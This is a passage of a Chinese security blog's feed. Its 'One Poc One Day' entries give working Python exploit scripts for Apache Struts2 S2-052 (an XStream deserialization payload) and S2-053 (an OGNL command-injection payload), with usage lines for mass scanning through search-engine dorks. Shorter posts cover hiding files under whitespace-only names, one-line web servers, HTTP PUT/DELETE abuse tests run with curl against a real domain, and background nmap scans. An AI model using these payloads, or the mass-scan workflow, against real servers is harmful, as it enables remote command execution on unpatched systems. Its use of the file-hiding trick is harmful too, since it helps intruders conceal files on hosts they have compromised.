class="name">jdk.nashorn.internal.objects.NativeStringreference="..</span>/<span class="attr">..</span>/<span class="attr">entry</span>/<span class="attr">jdk.nashorn.internal.objects.NativeString</span>"/&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Poc"><a href="#Poc" class="headerlink" title="## Poc"></a>## Poc</h4><blockquote><p>em……一切为了配合POC-T，多多适配Poc，多多积累自己的script。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># project = https://github.com/yizhimanpadewoniu</span></span><br><span class="line"><span class="comment"># author = am4zing</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Struts2 S2-052</span></span><br><span class="line"><span class="string">影响版本： Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2052 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2052 -aZ "login.action"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2052 -iF FILE.txt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">'http://'</span> + url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span></span><br><span class="line">        header[<span class="string">'Content-Type'</span>] = <span class="string">"application/xml"</span></span><br><span class="line">        <span class="comment"># header['Accept'] = "*/*"</span></span><br><span class="line">        header[<span class="string">'Connection'</span>] = <span class="string">"close"</span></span><br><span class="line">        header[<span class="string">'Accept'</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></span><br><span class="line">        payload = <span class="string">'''&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt;&lt;flags&gt;0&lt;/flags&gt;&lt;valueclass="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;&lt;dataHandler&gt;&lt;dataSourceclass="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;&lt;isclass="javax.crypto.CipherInputStream"&gt;&lt;cipherclass="javax.crypto.NullCipher"&gt;&lt;initialized&gt;false&lt;/initialized&gt;&lt;opmode&gt;0&lt;/opmode&gt;&lt;serviceIteratorclass="javax.imageio.spi.FilterIterator"&gt;&lt;iterclass="javax.imageio.spi.FilterIterator"&gt;&lt;iterclass="java.util.Collections$EmptyIterator"/&gt;&lt;nextclass="java.lang.ProcessBuilder"&gt;&lt;command&gt;&lt;string&gt;touch&lt;/string&gt;&lt;string&gt;/tmp/success&lt;/string&gt;&lt;/command&gt;&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;&lt;/next&gt;&lt;/iter&gt;&lt;filterclass="javax.imageio.ImageIO$ContainsFilter"&gt;&lt;method&gt;&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;&lt;name&gt;start&lt;/name&gt;&lt;parameter-types/&gt;&lt;/method&gt;&lt;name&gt;foo&lt;/name&gt;&lt;/filter&gt;&lt;nextclass="string"&gt;foo&lt;/next&gt;&lt;/serviceIterator&gt;&lt;lock/&gt;&lt;/cipher&gt;&lt;inputclass="java.lang.ProcessBuilder$NullInputStream"/&gt;&lt;ibuffer&gt;&lt;/ibuffer&gt;&lt;done&gt;false&lt;/done&gt;&lt;ostart&gt;0&lt;/ostart&gt;&lt;ofinish&gt;0&lt;/ofinish&gt;&lt;closed&gt;false&lt;/closed&gt;&lt;/is&gt;&lt;consumed&gt;false&lt;/consumed&gt;&lt;/dataSource&gt;&lt;transferFlavors/&gt;&lt;/dataHandler&gt;&lt;dataLen&gt;0&lt;/dataLen&gt;&lt;/value&gt;&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;jdk.nashorn.internal.objects.NativeStringreference="../jdk.nashorn.internal.objects.NativeString"/&gt;&lt;/entry&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeStringreference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;&lt;jdk.nashorn.internal.objects.NativeStringreference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;&lt;/entry&gt;&lt;/map&gt;'''</span></span><br><span class="line">        response_data = requests.post(url, data=payload, headers=header)</span><br><span class="line">        <span class="keyword">if</span> response_data.status_code == <span class="number">500</span> <span class="keyword">or</span> <span class="string">r"java.security.Provider$Service"</span> <span class="keyword">in</span> response_data.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[s2-052]'</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> response_data.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【One Poc One Day】—— Struts-053</title>
      <link href="/2018/08/01/%E3%80%90One-Poc-One-Day%E3%80%91%E2%80%94%E2%80%94Struts-053/"/>
      <url>/2018/08/01/%E3%80%90One-Poc-One-Day%E3%80%91%E2%80%94%E2%80%94Struts-053/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote><p><strong>One Poc One Day —— Struts2 053</strong> </p></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><h4 id="原理"><a href="#原理" class="headerlink" title="## 原理"></a>## 原理</h4><blockquote><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。 </p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="## payload"></a>## payload</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; %&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="Poc"><a href="#Poc" class="headerlink" title="## Poc"></a>## Poc</h4><blockquote><p>payload从vulhub直接拿来用了，但是payload末尾有个换行是不可以删掉的，删掉的话会导致payload执行不成功，所以这里直接对payload进行URL编码。</p><p>注： </p><ul><li><strong>poc需要传入参数，所以批量检测的话可能误报会高？</strong></li><li><strong>判断是否存在漏洞的条件有点不够准确</strong></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># project = https://github.com/yizhimanpadewoniu</span></span><br><span class="line"><span class="comment"># author = am4zing</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Struts2 S2-053 </span></span><br><span class="line"><span class="string">影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    vuln_var = raw_input(<span class="string">"Need a vuln_var(default is 'redirectUri'):"</span>)</span><br><span class="line">    <span class="keyword">if</span> vuln_var == <span class="string">''</span>:</span><br><span class="line">        vuln_var = <span class="string">'redirectUri'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">"http://"</span> + url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span></span><br><span class="line">        header[<span class="string">'Content-Type'</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">        payload = <span class="string">"%s="</span> % vuln_var + <span class="string">'''%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A'''</span></span><br><span class="line">        req = urllib2.Request(url, data=payload, headers=header)</span><br><span class="line">        response_data = urllib2.urlopen(req)</span><br><span class="line">        response_data = response_data.read()</span><br><span class="line">        sign = [<span class="string">'Microsoft'</span>, <span class="string">'uid'</span>]</span><br><span class="line">        <span class="keyword">if</span> sign[<span class="number">0</span>] <span class="keyword">in</span> response_data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[s2-053]'</span> + url</span><br><span class="line">        <span class="keyword">elif</span> sign[<span class="number">1</span>] <span class="keyword">in</span> response_data:</span><br><span class="line">            <span class="comment"># print 'yes'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[s2-053]'</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> response_data</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/08/01/5b6143a2cc07a.png" alt="Poc"></p>]]></content>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FileName Bypass</title>
      <link href="/2018/07/23/Filename_space_charactor/"/>
      <url>/2018/07/23/Filename_space_charactor/</url>
      <content type="html"><![CDATA[<h2 id="0x01-Only-“space-characters”"><a href="#0x01-Only-“space-characters”" class="headerlink" title="#0x01 Only “space characters”"></a>#0x01 Only “space characters”</h2><blockquote><p><strong>使用空格符做文件名，达到隐藏的目的，使用“ls -la”命令，可能都无法察觉</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; <span class="string">' '</span></span><br><span class="line">cat &gt; <span class="string">" "</span></span><br><span class="line">cat &gt; \ </span><br><span class="line">cat &gt; .\</span><br><span class="line">cat &gt; \ \ \ \</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/23/5b5546e8c5594.png" alt="测试过程"></p>]]></content>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Oneliner Webserver</title>
      <link href="/2018/06/28/oneliner%20webserver/"/>
      <url>/2018/06/28/oneliner%20webserver/</url>
      <content type="html"><![CDATA[<h2 id="0x01-Oneliner-Webserver"><a href="#0x01-Oneliner-Webserver" class="headerlink" title="0x01 Oneliner Webserver"></a>0x01 Oneliner Webserver</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ul><li>python3</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8888</span></span><br></pre></td></tr></table></figure><ul><li>python2</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer <span class="number">8888</span></span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php -S localhost:<span class="number">8888</span> -t evil/</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> PHP &gt;=<span class="number">5.4</span></span><br><span class="line">   $ php -S localhost:<span class="number">8888</span></span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO::All -e <span class="string">'io(":8080")-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / &#125;)'</span></span><br></pre></td></tr></table></figure><h3 id="Necat"><a href="#Necat" class="headerlink" title="Necat"></a>Necat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> nc -l 80 &lt; test.html; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">ncat -k -l -p 1337 -c <span class="string">"printf 'HTTP/1.1 200 OK\r\n\r\n'; cat ~/evil.html"</span></span><br></pre></td></tr></table></figure><h3 id="IIS-Express"><a href="#IIS-Express" class="headerlink" title="IIS Express"></a>IIS Express</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; <span class="string">"C:\Program Files (x86)\IIS Express\iisexpress.exe"</span> /path:C:\MyWeb /port:<span class="number">8000</span></span><br></pre></td></tr></table></figure><h2 id="BusyBox"><a href="#BusyBox" class="headerlink" title="BusyBox"></a>BusyBox</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Busybox httpd</span><br><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure><h2 id="0x02-更多参考"><a href="#0x02-更多参考" class="headerlink" title="0x02 更多参考"></a>0x02 更多参考</h2><p><a href="https://gist.github.com/willurd/5720255" target="_blank" rel="noopener">Web server : https://gist.github.com/willurd/5720255</a></p>]]></content>
      
      
        <tags>
            
            <tag> webserver </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>检测不安全的http请求</title>
      <link href="/2018/06/17/%E6%A3%80%E6%B5%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84http%E8%AF%B7%E6%B1%82/"/>
      <url>/2018/06/17/%E6%A3%80%E6%B5%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84http%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<h3 id="0x01-其他方法"><a href="#0x01-其他方法" class="headerlink" title="## 0x01 其他方法"></a>## 0x01 其他方法</h3><blockquote><ul><li>PUT        //向指定的目录上载文件</li><li>DELETE        //删除指定的资源</li><li>COPY        //将指定的资源复制到Destination消息头指定的位置</li><li>MOVE        //将指定的资源移动到Destination消息头指定的位置</li><li>SEARCH        //在一个目录路径中搜索资源</li><li>PROPFIND        //获取与指定资源有关的信息，如作者、大小与内容类型</li><li>TRACE        //在响应中返回服务器收到的原始请求</li></ul></blockquote><h3 id="0x02-手动测试"><a href="#0x02-手动测试" class="headerlink" title="## 0x02 手动测试"></a>## 0x02 手动测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X OPTIONS http://www.baidu.com/<span class="built_in">test</span>/</span><br><span class="line"></span><br><span class="line">查看响应的 Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS</span><br><span class="line"></span><br><span class="line">curl -X DELETE http://www.baidu.com/<span class="built_in">test</span>/test2.html</span><br><span class="line"></span><br><span class="line">如果删除成功，则攻击有效。</span><br><span class="line"></span><br><span class="line">curl -v -T test.html  http://www.baidu.com/<span class="built_in">test</span>/test.html</span><br><span class="line"></span><br><span class="line">看是否能上载来判断攻击是否生效。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/17/5b4d60156d203.png" alt="检测Option方法"></p>]]></content>
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【漫谈-转】What is Process</title>
      <link href="/2018/06/11/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91What%20is%20Process/"/>
      <url>/2018/06/11/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91What%20is%20Process/</url>
      <content type="html"><![CDATA[<h2 id="0×00-Process"><a href="#0×00-Process" class="headerlink" title="0×00 Process"></a>0×00 Process</h2><p>看到一张讲解Process的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/11/5acd532f4252c.jpg" alt="Process.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> system </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nohup命令——后台执行命令</title>
      <link href="/2018/06/05/nohup%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/06/05/nohup%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h2 id="nohup命令"><a href="#nohup命令" class="headerlink" title="# nohup命令"></a># nohup命令</h2><h4 id="0x01-发现问题"><a href="#0x01-发现问题" class="headerlink" title="## 0x01 发现问题"></a>## 0x01 发现问题</h4><blockquote><p>经常使用xshell等工具，需要执行多个命令时，当前命令行已被上一命令占据，再开一个窗口有些浪费资源，nohup可以结合”&amp;“实现后台执行无交互命令，并指定输出的目的.</p></blockquote><p><img src="https://i.loli.net/2018/08/07/5b6960b8ee84e.png" alt="命令行被占用"></p><blockquote><p><strong>试想，此处如果需要通过ssh的方式，在远端主机上执行一条nmap的全端口扫描任务，但是ssh连接断开时nmap扫描状态会随着ssh状态变化而失效，下次登陆需要重新进行扫描。</strong></p><p>那么，下面的这条命令可以解决问题么？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup nmap -p 1-65535 -T4 -A -v -Pn -sV -sS 111.*.*.* &gt; zixun</span><br></pre></td></tr></table></figure><h4 id="0x02-后台运行“-amp-”"><a href="#0x02-后台运行“-amp-”" class="headerlink" title="## 0x02 后台运行“&amp;”"></a>## 0x02 后台运行“&amp;”</h4><blockquote><p>“&amp;”符号可以将命令符后台运行。如find命令或者其他shell脚本，并且执行过程中无交互，否则会一直处于等待状态。</p><blockquote><p>eg: sh test.sh &amp;</p></blockquote></blockquote><blockquote><p>到此，我们可以将命令设置为形如下面的示例：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup nmap -p 1-65535 -T4 -A -v -Pn -sV -sS 111.*.*.* &gt; zixun &amp;</span><br></pre></td></tr></table></figure><h4 id="0x03-“2-gt-amp-1”"><a href="#0x03-“2-gt-amp-1”" class="headerlink" title="## 0x03 “2&gt;&amp;1”"></a>## 0x03 “2&gt;&amp;1”</h4><blockquote><p>至此，一个完整的命令为：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="built_in">command</span> &gt;out.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>即：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup nmap -Pn -PS -sV -sS -p 1-65535 192.168.1.1 -oX out.xml &gt; nohup.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>实际的一次操作过程如下：</p></blockquote><p><img src="https://i.loli.net/2018/08/07/5b6958c55693e.jpg" alt="nohup1"></p><p><img src="https://i.loli.net/2018/08/07/5b6958c561ec9.jpg" alt="nohup2"></p><p><img src="https://i.loli.net/2018/08/07/5b6958c561f4b.jpg" alt="nohup3"></p><h4 id="0x04-会话保持-终止"><a href="#0x04-会话保持-终止" class="headerlink" title="## 0x04 会话保持/终止"></a>## 0x04 会话保持/终止</h4><ul><li>正常使用</li></ul><blockquote><ul><li>使用了nohup之后，在当前账户非正常退出或者结束的时候，命令会结束。所以在使用nohup命令后台运行命令之后，需要使用exit正常退出当前账户，这样才能保证命令一直在后台运行。</li></ul></blockquote><ul><li>其他情况</li></ul><blockquote><ul><li>ctrl + z ：可以将一个正在前台执行的命令放到后台，并且处于暂停状态。</li><li>Ctrl+c ：终止前台命令。</li><li>jobs ：查看当前有多少在后台运行的命令。<ul><li>jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated。但是如果任务被终止了（kill），shell 从当前的shell环境已知的列表中删除任务的进程标识。</li></ul></li></ul></blockquote><ul><li>终止</li></ul><blockquote><ul><li>命令成功执行后，会显示一个进程号，可以用它来监控该进程，或kill它。(ps -ef | grep 进程号 或者 kill -9 进程号）</li></ul></blockquote><h4 id="0x05-注意几点"><a href="#0x05-注意几点" class="headerlink" title="## 0x05 注意几点"></a>## 0x05 注意几点</h4><blockquote><ul><li>command &gt; out.file是将command的输出重定向到out.file文件，即输出内容不打印到屏幕上，而是输出到out.file文件中。</li><li>2&gt;&amp;1 是将标准出错重定向到标准输出，这里的标准输出已经重定向到了out.file文件，即将标准出错也输出到out.file文件中。最后一个&amp;， 是让该命令在后台执行。</li><li>命令”nohup nmap -Pn -PS -sV -sS -p 1-65535 192.168.1.1 -oX out.xml &gt; nohup.txt 2&gt;&amp;1 &amp;“中：<ul><li>nmap 扫描将结果输出到out.xml</li><li>nohup 将过程输出重定向到nohup.txt</li><li>2&gt;&amp;1 也将标准出错重定向到nohup.txt</li></ul></li></ul></blockquote>]]></content>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【漫谈-转】System Call</title>
      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/"/>
      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91System%20Call/</url>
      <content type="html"><![CDATA[<h2 id="0×00-Process"><a href="#0×00-Process" class="headerlink" title="0×00 Process"></a>0×00 Process</h2><p>看到一张讲解System Call的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/25/5ae0352e5101d.jpg" alt="系统调用.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> system </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【漫谈-转】Unix Permissions</title>
      <link href="/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/"/>
      <url>/2018/06/01/%E3%80%90%E6%BC%AB%E8%B0%88-%E8%BD%AC%E3%80%91Unix%20Permissions/</url>
      <content type="html"><![CDATA[<h2 id="0×00-Unix-Permissions"><a href="#0×00-Unix-Permissions" class="headerlink" title="0×00 Unix Permissions"></a>0×00 Unix Permissions</h2><p>看到一张讲解Unix Permissions的图，画的简单易懂又好看。</p><p><img src="https://i.loli.net/2018/04/08/5ac98ad84a5ea.jpg" alt="UnixPermissions.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> system </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pip install package访问速度太慢解决办法</title>
      <link href="/2018/05/25/pip%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E8%AE%BF%E9%97%AE%E5%A4%AA%E6%85%A2/"/>
      <url>/2018/05/25/pip%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E8%AE%BF%E9%97%AE%E5%A4%AA%E6%85%A2/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>在通过pip安装第三方工具包的时候，出现下面的报错，因为访问太慢</p><p><img src="https://i.loli.net/2018/05/25/5b07c129ace4b.jpg" alt="ssl_timeout.jpg"></p><blockquote><p>解决办法如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; pip install package -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote></blockquote><p><img src="https://i.loli.net/2018/05/25/5b07c129ad546.jpg" alt="ssl报错.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Protocol handler混淆</title>
      <link href="/2018/05/22/Protocol%20handler%E6%B7%B7%E6%B7%86/"/>
      <url>/2018/05/22/Protocol%20handler%E6%B7%B7%E6%B7%86/</url>
